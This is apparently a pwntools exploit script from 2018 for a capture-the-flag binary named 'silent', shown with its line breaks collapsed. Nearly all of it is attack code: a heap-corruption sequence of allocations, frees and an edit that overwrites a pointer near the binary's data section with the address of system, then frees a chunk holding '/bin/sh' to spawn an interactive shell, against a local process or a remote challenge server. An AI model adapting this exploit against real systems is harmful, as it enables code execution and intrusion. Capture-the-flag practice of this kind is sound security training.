## file: exp for silent## date: 2018-04-26## author: raycp

from pwn import *from ctypes import *DEBUG = 1if DEBUG:     p = process('./silent')     #scontext.log_level = 'debug'     #libc = ELF('/lib32/libc-2.24.so')     #p = process(['./babystack.dms'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc_64.so.6')})     lib = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')     else:     p = remote('39.107.33.43', 13570)     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')     #libc = ELF('libc_64.so.6')#context.log_level = 'debug'def add(size,data):    sleep(0.5)    p.sendline('1\n')    sleep(0.25)    p.sendline(str(size))    sleep(0.25)    p.send(data)def edit(idx,data,data2):    sleep(0.25)    p.sendline('3\n')    sleep(0.25)    p.sendline(str(idx))    sleep(0.25)    p.send(data)    sleep(0.25)    p.send(data2)def delete(idx):    sleep(0.5)    p.sendline('2\n')    sleep(0.25)    p.sendline(str(idx))    addr=0x602000system_plt=0x400730def pwn():    gdb.attach(p,'b*0x400b8d\nb*0x400af1')    add(0x50,'0'.ljust(0x50-1)) #0    add(0x50,'a'.ljust(0x50-1)) #1    add(0x50,'/bin/sh\x00'.ljust(0x50-1)) #2    delete(1)    delete(0)    edit(0,p32(addr-0x6),'a'.ljust(47))    add(0x50,'a'.ljust(0x50-1)) #3        add(0x50,'\x00'*6+p64(0)+p64(system_plt))    delete(2)    p.interactive()if __name__ == '__main__':   pwn()     